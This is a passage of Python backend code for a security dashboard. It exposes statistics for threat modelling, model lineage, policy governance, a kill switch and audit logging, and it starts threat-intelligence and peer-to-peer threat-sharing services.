            "low_confidence_count": 0,
            "average_confidence": 0.0,
            "decisions": []
        }


def clear_forensic_reports() -> Dict:
    """Clear JSON forensic reports generated by the Explainability Engine.

    This is used by the dashboard reset control so operators can
    start a fresh set of forensic JSON artifacts without touching
    the directory structure.
    """
    if not EXPLAINABILITY_AVAILABLE:
        return {
            "success": False,
            "error": "Explainability engine not available",
            "removed": 0,
        }

    try:
        from AI.explainability_engine import get_explainability_engine

        engine = get_explainability_engine()
        result = engine.reset_forensic_reports()
        # Ensure a consistent top-level success flag
        if "success" not in result:
            result["success"] = True
        return result
    except Exception as e:
        return {"success": False, "error": str(e), "removed": 0}


# ============================================================================
# NEW MODULES B, C, D, F, G, H, J - API INTEGRATION FUNCTIONS
# ============================================================================

def get_byzantine_defense_stats() -> Dict:
    """Get Byzantine-resilient federated learning statistics."""
    try:
        # Import via the AI package so this works consistently in Docker
        # and on bare metal.
        from AI.byzantine_federated_learning import get_byzantine_defender
        defender = get_byzantine_defender()
        return defender.get_stats()
    except Exception as e:
        return {"error": str(e), "enabled": False}


def get_model_lineage_stats() -> Dict:
    """Get cryptographic model lineage statistics."""
    try:
        from cryptographic_lineage import get_lineage_tracker
        tracker = get_lineage_tracker()
        stats = tracker.get_stats()
        
        # Add integrity check
        integrity = tracker.verify_chain_integrity()
        stats['chain_integrity'] = integrity

        # Add lineage-based drift/poisoning detection summary
        drift = tracker.detect_model_drift_via_lineage()
        stats['lineage_drift'] = drift

        # If drift is detected, mirror it into the comprehensive audit log
        # so Stage 7 can treat it as a concrete crypto/lineage signal.
        if drift.get('drift_detected'):
            try:
                from emergency_killswitch import get_audit_log, AuditEventType

                audit = get_audit_log()
                audit.log_event(
                    event_type=AuditEventType.THREAT_DETECTED,
                    actor="cryptographic_lineage",
                    action="lineage_drift_detected",
                    target="model_lineage_chain",
                    outcome="detected",
                    details=drift,
                    risk_level="high" if drift.get('reason', '').lower().startswith('high proportion of peer') else "medium",
                    metadata={"module": "cryptographic_lineage"},
                )
            except Exception:
                # Stats API should never fail just because audit logging failed
                pass
        
        return stats
    except Exception as e:
        return {"error": str(e), "enabled": False}


def get_deterministic_eval_stats() -> Dict:
    """Get deterministic evaluation statistics."""
    try:
        from deterministic_evaluation import get_deterministic_evaluator
        evaluator = get_deterministic_evaluator()
        return evaluator.get_stats()
    except Exception as e:
        return {"error": str(e), "enabled": False}


def get_threat_model_stats() -> Dict:
    """Get formal threat model statistics."""
    try:
        from formal_threat_model import get_threat_model
        model = get_threat_model()
        # Base stats from the formal model (kept for backwards compatibility)
        base_stats = model.get_stats()

        # Normalize threat coverage structure for JSON/UI consumption
        raw_coverage = model.get_threat_coverage()
        total_threat_categories = raw_coverage.get("total_threat_categories", 0)
        covered_raw = raw_coverage.get("covered_categories", [])
        uncovered_raw = raw_coverage.get("uncovered_categories", [])

        # Convert any Enum values to their string representation
        def _to_value_list(items):
            return [getattr(item, "value", item) for item in items]

        covered_categories = _to_value_list(covered_raw)
        uncovered_categories = _to_value_list(uncovered_raw)

        coverage_percent = raw_coverage.get("coverage_percent")
        if coverage_percent is None and total_threat_categories:
            # Fallback calculation if older data structure is present
            coverage_percent = (len(covered_categories) / float(total_threat_categories)) * 100.0

        # UI expects a 0-1 fraction in `coverage_percentage` and multiplies by 100
        coverage_percentage = (coverage_percent / 100.0) if coverage_percent is not None else 0.0

        coverage = {
            "total_threat_categories": total_threat_categories,
            "covered_categories": covered_categories,
            "uncovered_categories": uncovered_categories,
            "coverage_percent": coverage_percent if coverage_percent is not None else 0.0,
            "coverage_percentage": coverage_percentage,
        }

        # Derive policy-level stats for the dashboard
        threat_rules = getattr(model, "threat_rules", {}) or {}
        total_policies = len(threat_rules)

        enforced_actions = 0
        blocked_actions = 0
        policy_summary = []

        for rule in threat_rules.values():
            allowed_actions = getattr(rule, "allowed_actions", []) or []
            prohibited_actions = getattr(rule, "prohibited_actions", []) or []

            enforced_actions += len(allowed_actions)
            blocked_actions += len(prohibited_actions)

            # Derive a primary allowed action (first in list, if present)
            if allowed_actions:
                primary_action = getattr(allowed_actions[0], "value", allowed_actions[0])
            else:
                primary_action = "log_only"

            threat_type = getattr(rule, "threat_category", None)
            threat_type = getattr(threat_type, "value", threat_type) if threat_type is not None else "unknown"

            min_confidence = float(getattr(rule, "severity_threshold", 0.0))

            policy_summary.append({
                "threat_type": threat_type,
                "allowed_action": primary_action,
                "min_confidence": min_confidence,
            })

        # Response tailored to the Section 12 Threat Model tab while
        # preserving original fields for any other consumers
        return {
            # New, UI-focused fields
            "enabled": True,
            "total_policies": total_policies,
            "enforced_actions": enforced_actions,
            "blocked_actions": blocked_actions,
            "policy_summary": policy_summary,
            "threat_coverage": coverage,
            # Original stats retained for compatibility
            "total_rules": base_stats.get("total_rules", total_policies),
            "total_constraints": base_stats.get("total_constraints", 0),
            "rules_requiring_approval": base_stats.get("rules_requiring_approval", 0),
        }
    except Exception as e:
        return {"error": str(e), "enabled": False}


def get_self_protection_stats() -> Dict:
    """Get self-protection and integrity monitoring statistics."""
    try:
        from self_protection import get_self_protection
        protection = get_self_protection()
        stats = protection.get_stats()
        
        # Add recent violations summary
        violations = protection.get_violation_summary(time_window_hours=24)
        stats['violations_24h'] = violations
        
        return stats
    except Exception as e:
        return {"error": str(e), "enabled": False}


def get_policy_governance_stats() -> Dict:
    """Get policy governance and approval queue statistics."""
    try:
        from policy_governance import get_policy_governance
        governance = get_policy_governance()
        stats = governance.get_stats()
        
        # Add pending requests
        pending = governance.get_pending_requests()
        stats['pending_requests'] = [
            {
                "request_id": r.request_id,
                "proposed_action": r.proposed_action,
                "target": r.target,
                "risk_level": r.risk_level.value,
                "confidence": r.confidence,
                "timestamp": r.timestamp,
                "expires_at": r.expires_at
            }
            for r in pending[:10]  # Limit to 10 most recent
        ]
        
        return stats
    except Exception as e:
        return {"error": str(e), "enabled": False}


def get_killswitch_status() -> Dict:
    """Get emergency kill-switch status."""
    try:
        from emergency_killswitch import get_kill_switch
        killswitch = get_kill_switch()
        return killswitch.get_status()
    except Exception as e:
        return {"error": str(e), "enabled": False}


def get_audit_log_stats() -> Dict:
    """Get comprehensive audit log statistics."""
    try:
        from emergency_killswitch import get_audit_log
        audit = get_audit_log()
        stats = audit.get_stats()
        
        # Add compliance report
        compliance = audit.get_compliance_report(days=7)
        stats['compliance_report_7d'] = compliance
        
        return stats
    except Exception as e:
        return {"error": str(e), "enabled": False}


def clear_audit_log() -> Dict:
    """Clear the comprehensive audit log JSON file.

    This is used by the dashboard "reset" control in Governance &
    Emergency Controls (Section 23) to make the audit log look
    brand new while keeping the underlying storage directory and
    archive files intact.
    """
    try:
        from emergency_killswitch import get_audit_log
        audit = get_audit_log()
        return audit.reset_log()
    except Exception as e:
        return {"success": False, "error": str(e), "enabled": False}


# Load persistent threat data on module import
try:
    _load_threat_data()
    print("[INIT] ✅ Threat data loaded successfully")
except Exception as e:
    print(f"[INIT ERROR] Failed to load threat data: {e}")
    import traceback
    traceback.print_exc()
    print("[INIT WARNING] Continuing with empty threat database...")

# Initialize Enterprise Threat Intelligence (VirusTotal, ExploitDB, Honeypots)
if ENTERPRISE_FEATURES_AVAILABLE:
    try:
        start_threat_intelligence_engine()
        demo_api_key = start_enterprise_integration()
        print(f"[ENTERPRISE] System ready for commercial deployment")
        print(f"[ENTERPRISE] Demo API Key: {demo_api_key}")
    except Exception as e:
        print(f"[ENTERPRISE WARNING] Failed to start enterprise features: {e}")

# Start P2P Threat Sharing
if P2P_SYNC_AVAILABLE:
    try:
        start_p2p_sync()
        sync_status = get_p2p_status()
        if sync_status['enabled']:
            print(f"[P2P] Connected to {sync_status['peers_configured']} peer containers")
            print(f"[P2P] Mesh network active - all containers share threats equally")
            print(f"[P2P] When A gets attacked, B and C learn automatically 🌐")
        else:
            print(f"[P2P] Running standalone - configure PEER_URLS to join mesh")
    except Exception as e:
        print(f"[P2P WARNING] Failed to start P2P sync: {e}")
